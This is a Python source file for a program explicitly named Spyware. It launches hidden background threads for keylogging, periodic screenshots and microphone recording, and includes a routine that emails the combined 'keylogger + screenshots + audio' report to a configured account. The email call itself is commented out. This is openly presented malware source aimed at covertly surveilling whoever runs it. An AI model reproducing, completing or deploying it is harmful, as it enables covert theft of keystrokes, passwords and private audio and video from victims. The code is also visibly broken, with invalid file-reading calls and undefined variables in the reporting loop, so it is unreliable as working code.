from time import sleep
from threading import Thread
import cv2
import os
from PIL import Image
import shutil
from functools import partial
import multiprocessing
import json
import random

from modules.log import Logger
from modules.grab_screen import Visual
from modules.send_email import send_mail
from modules.grab_audio import Audio
from modules.normalize_path import normalize_path_name


class Spyware:
    def __init__(self):
        self.keylogger_report = ''
        self.screenshot_period = 5
        self.user_path = normalize_path_name(os.path.expanduser('~'), 'documents')

        with open('./user_info/info.json') as input_file:
            reader = input_file.reader()
            self.user_info = json.loads(reader)

        self.audio_period = self.user_info.frequency - 2

    def start(self):
        logger = Logger(self.user_info.frequency, self.user_path)
        audio = Audio(self.audio_period, self.user_path)
        visual = Visual(self.screenshot_period, self.user_path, self.user_info.frequency)

        self.setup_dirs()

        async_tasks = [
                Thread(target=visual.make_screenshot, daemon=True),
                Thread(target=logger.init, daemon=True),
                Thread(target=audio.handle_audio, daemon=True),
                Thread(target=self.reporting, daemon=True)
        ]

        [t.start() for t in async_tasks]

    def reporting(self):
        while True:
            sleep(self.user_info.frequency)
            visual.make_pdf()
            log = logger.get_log()

            # self.send_report()

    def send_report(self, file_path):
        message_rep = 'Full report (keylogger + screenshots + audio)'
        try:
            send_mail(self.user_info.email, self.user_info.password, message_rep, 'Spyware report', file_path)
        except:
            error_msg = 'Could not send that'
            send_mail(self.user_info.email, self.user_info.password, error_msg, 'Spyware report', file_path)

    def setup_dirs(self):
        if not os.path.isdir(normalize_path_name(self.user_path, 'images_record')):
            os.mkdir(normalize_path_name(self.user_path, 'images_record'))

        if not os.path.isdir(normalize_path_name(self.user_path, 'audio_record')):
            os.mkdir(normalize_path_name(self.user_path, 'audio_record'))

        if not os.path.isdir(normalize_path_name(self.user_path, 'keylog_record')):
            os.mkdir(normalize_path_name(self.user_path, 'keylog_record'))


if __name__ == '__main__':
    multiprocessing.freeze_support()

    spw = Spyware()
    spw.start()
